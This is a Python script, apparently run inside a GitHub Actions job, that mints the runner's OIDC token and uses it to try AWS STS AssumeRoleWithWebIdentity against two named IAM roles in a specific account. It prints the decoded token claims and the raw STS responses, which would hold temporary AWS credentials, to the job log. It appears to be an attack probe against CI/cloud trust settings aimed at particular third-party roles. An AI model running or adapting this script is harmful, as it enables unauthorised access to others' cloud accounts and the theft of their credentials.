import json, os, urllib.request, urllib.error, urllib.parse, base64
base=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; tok=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
def mint(aud):
    url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote(aud)
    req=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json','User-Agent':'i124919'})
    return json.loads(urllib.request.urlopen(req,timeout=30).read())['value']
def getclaims(jwt):
    p=jwt.split('.')[1]; p+='='*(-len(p)%4)
    return json.loads(base64.urlsafe_b64decode(p))
def post(url,data,headers=None):
    body=urllib.parse.urlencode(data).encode()
    req=urllib.request.Request(url,data=body,headers=headers or {'Content-Type':'application/x-www-form-urlencoded','User-Agent':'i124919'})
    try:
        r=urllib.request.urlopen(req,timeout=35); return r.status, r.read().decode('utf-8','replace')[:2000]
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')[:2000]
    except Exception as e: return -1, str(e)[:200]
out={}
j=mint('sts.amazonaws.com'); c=getclaims(j)
out['claims']={k:c.get(k) for k in ('sub','aud','iss','repository','ref','event_name','repository_owner','job_workflow_ref')}
out['env']={k:os.environ.get(k) for k in ('GITHUB_REPOSITORY','GITHUB_REF','GITHUB_EVENT_NAME','GITHUB_WORKFLOW_REF','GITHUB_SHA')}
out['token_len']=len(j)
for arn in ['arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole',
            'arn:aws:iam::159553542841:role/adai-template-publisher']:
    st,b=post('https://sts.amazonaws.com/',{'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'i124919','WebIdentityToken':j,'DurationSeconds':'3600'})
    out['sts::'+arn]={'http':st,'body':b}
print('I124919_OIDC_RESULT='+json.dumps(out))
